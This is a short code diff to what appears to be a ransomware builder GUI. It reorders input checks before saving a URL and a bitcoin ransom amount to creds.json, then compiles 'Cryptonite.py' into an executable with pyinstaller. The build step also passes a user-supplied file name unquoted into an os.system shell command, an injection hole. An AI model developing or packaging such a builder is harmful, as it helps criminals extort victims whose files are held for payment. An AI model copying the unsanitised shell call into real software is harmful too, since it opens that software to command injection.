@@ -23,6 +23,15 @@ def selectfolder():
             restore_btn.grid(row = 8, column = 0, pady = 20, sticky = "s", columnspan = 2)
 
 def generate():
+
+    import os
+    OS = os.name
+    if not folder:
+        return
+    PATH = os.path.abspath(folder)
+    FILE = name_entry.get()
+    if not FILE:
+        return
     configDict = {
         "URL": url_entry.get(),
         "BTC_AMOUNT": btcm_entry.get(),
@@ -32,14 +41,6 @@ def generate():
     }
     with open("creds.json", "w") as f:
         json.dump(configDict, f)
-    import os
-    OS = os.name
-    if not folder:
-        return
-    PATH = os.path.abspath(folder)
-    FILE = name_entry.get()
-    if not FILE:
-        return
     generate_btn.state(["disabled"])
     generate_btn.config(text = "Generating..")
     os.system(f"pyinstaller --onefile --clean --icon=\"icon.ico\" Cryptonite.py --name {FILE}")
